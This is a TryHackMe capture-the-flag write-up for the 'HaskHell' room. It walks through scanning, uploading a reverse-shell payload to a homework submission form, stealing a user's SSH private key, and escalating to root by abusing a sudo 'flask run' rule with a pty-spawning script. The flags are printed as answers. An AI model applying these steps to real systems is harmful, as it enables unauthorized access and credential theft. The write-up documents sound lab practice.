<p align="center">April 13, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{342}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/593042df-84f0-4fa9-acac-e12fe583466a" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/962ae40d-abca-4ea0-9255-663cad56a1a5"></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{HaskHell}}$$</h1>
<p align="center"><em>Teach your CS professor that his PhD isn't in security.</em>.<br>
 It is classified as a medium-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/haskhell">here</a>.</p>

<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/79a36bfe-f4f6-47f9-97b8-8db55453b671"> </p>

<br>
<br>

<h2>Task 1 . HaskHell </h2>

<p>[  Start Machine  ]</p>

<p>Show your professor that his PhD isn't in security.<br>

Please send comments/concerns/hatemail to @passthehashbrwn on Twitter.</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>Get the flag in the user.txt file.</em><br><a id='1.1'></a>
>> <strong><code>flag{academic_dishonesty}</code></strong><br>
<p></p>

<br>


<p>Used <code>nmapo</code>.  Discovered:<br>
.  2 ports open:  <code>22/ssh</code> and <code>5001/Gunicorn</code>code>.<br>
.  <code>http-server-header: gunicorn/19.7.1</code></br>
.  <code>http-title: Homepage</code></p>


```bash
:~/HaskHell# nmap -sC -sV -sS -Pn -A -p- -T4 TargetIP
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
5001/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
```

<br>

<p>Navigated to <code>http://TargetIP:5001</code></p>

<br>

![image](https://github.com/user-attachments/assets/708e34e1-f698-44b5-a307-8568e07661d6)

<br>

<p>Viewed page source.<br>
Identified:<br>
. <code>/homework1</code><br>
. <code>Our book for the course (free!): http://learnyouahaskell.com/chapters</code><br>
. <code>The complete Haskell package repository. ... grading system: https://hackage.haskell.org/</code></p>

<br>

![image](https://github.com/user-attachments/assets/5f7f31e7-2f3d-43be-ac82-04d84697c2f7)

<br>


<p>Added <code>Homepage</code> and <code>TargetIP</code> to <code>/etc/hosts</code>.</p>

<br>


![image](https://github.com/user-attachments/assets/c8afea6a-d981-44a2-a115-5fbccd5f61a6)

<br>

<p>Clicked <code>homework here</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/0708d00d-fad3-44c4-8d56-8935f5b14e81)


<br>

<p>Used <code>gobuster</code>.<br>
Discovered <code>/submit</code>.</p>

```bash
~/HaskHell# gobuster dir -u http://TargetIP:5001/ -w /usr/share/wordlists/dirb/common.txt
```

<br>

![image](https://github.com/user-attachments/assets/634271ab-2344-4528-b452-80683ee6d185)

<br>

<p>Navigated to <code>http://TargetIP:5001/submit</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/c12cf2fb-810f-4a13-9f63-1b627ce13f02)

<br>

<p>Set up a listener.</p>

<br>

<p>Browsed my payload and clicked <code>/Upload></code>.</p>

<br>

![image](https://github.com/user-attachments/assets/e99dc82a-2489-4f12-a540-f22323e118cb)

<br>

![image](https://github.com/user-attachments/assets/46da7ecc-b4ce-4f54-badc-9518d8cd3836)


<br>

![image](https://github.com/user-attachments/assets/f2d0204b-0b41-45b5-b6d0-3fbb4ff06d0b)

<br>

![image](https://github.com/user-attachments/assets/be6040b4-b932-4bb6-9e1e-a4ef853b1bf1)

<br>

![image](https://github.com/user-attachments/assets/7f43ddee-600a-473b-ab2a-e73ea7dac235)


<p>In the room introduction was mentioned <code>Show your professor that his PhD isn't in security.</code><br>
Decided to check <code>/prof</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/40f40a98-b506-4f24-aa82-16d7acb02693)

<br>


<p>I should have done "this" before ...<br>
It is still time ...</p>

<br>

![image](https://github.com/user-attachments/assets/352789c3-4ded-42e3-93bb-062709026beb)


<br>




> 1.2. <em>Obtain the flag in root.txt.</em><br><a id='1.2'></a>
>> <strong><code>flag{im_purely_functional}</code></strong><br>
<p></p>

<br><br>

<p>Copied the content of <code>/home/prof/.id_rsa</code> and created a file with it.</p>

<br>

![image](https://github.com/user-attachments/assets/13043383-55f5-40e2-8aae-a0890cf9970d)

<br>

<p>Used <code>ssh</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/2880d23f-f3f3-4bf8-b429-cd1232bf0391)

<br>

<p>Now we got access as <code>prof</code> and know that he has <code>root</code> privileges.</p>

<br>

![image](https://github.com/user-attachments/assets/5af79eaf-ccae-4b97-843c-afcd171a07b2)

<br>

<p>Googled Flask Python and learned what I should do.</p>

<br>

![image](https://github.com/user-attachments/assets/6d650dd2-1c55-4eec-810d-c22b898a1bbf)

<br>

<p>Goot access as <code>root</code>.</p>

<br>

```bash
:~/HaskHell# nano id_rsa
:~/HaskHell# chmod 600 id_rsa
:~/HaskHell# ssh -i id_rsa prof@10.10.196.189
...
$ whoami
prof
$ bash
prof@haskhell:~$ sudo -l
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
prof@haskhell:~$ sudo /usr/bin/flask run
Usage: flask run [OPTIONS]

Error: Could not locate Flask application. You did not provide the FLASK_APP environment variable.

For more information see http://flask.pocoo.org/docs/latest/quickstart/
prof@haskhell:~$ 
prof@haskhell:~$ echo 'import pty;pty.spawn("/bin/bash")' > privilege.py
prof@haskhell:~$ cat privilege.py
import pty;pty.spawn("/bin/bash")
prof@haskhell:~$ export FLASK_APP=privilege.py
prof@haskhell:~$ sudo /usr/bin/flask run
root@haskhell:~# pwd
/home/prof
root@haskhell:~# cd /root
root@haskhell:/root# ls
root.txt
root@haskhell:/root# cat root.txt
flag{im_purely_functional}
root@haskhell:/root# 
```

<br>
<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="900px" src="https://github.com/user-attachments/assets/5627a792-ea2b-4ba1-a925-65a6ac4225dd"><br>
<img width="900px" src="https://github.com/user-attachments/assets/edfdb963-92c1-4dfe-9b9c-5587d213e114"></p>


<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>


<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |Global        | Brazil       | Global      | Brazil     |          | Completed |           |
| April 13, 2025    | 342      |     285ᵗʰ    |        7ᵗʰ   |    208ᵗʰ    |     3ʳᵈ    |  93,318  |       659 |   59      |

</div>

<br>

<p align="center"> Global All Time: 285ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/f2b0b700-f076-4407-92d3-0cfdb40ed674"> </p>

<p align="center"> Brazil All Time: 7ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/87d2e15d-6965-4dc1-9984-f5047897c9f9"> </p>

<p align="center"> Global monthly: 208ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/839bf560-f74d-43ce-9d03-e62e9e54ba1f"> </p>

<p align="center"> Brazil monthly: 3ʳᵈ<br><br><img width="900px" src="https://github.com/user-attachments/assets/369ecd02-3c71-4d3d-adfc-ec7f92ed6624"> </p>


<br>


<p align="center">Weekly League: 3ʳᵈ Bronze<br><br><img width="900px" src="https://github.com/user-attachments/assets/4573fb4b-7cb6-4bf5-b3d8-edda8829a928"> </p>

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/sgtscout">sgtscout</a> for investing your time and effort to develop this walkthrough so that I could sharpen my skills!</p> 
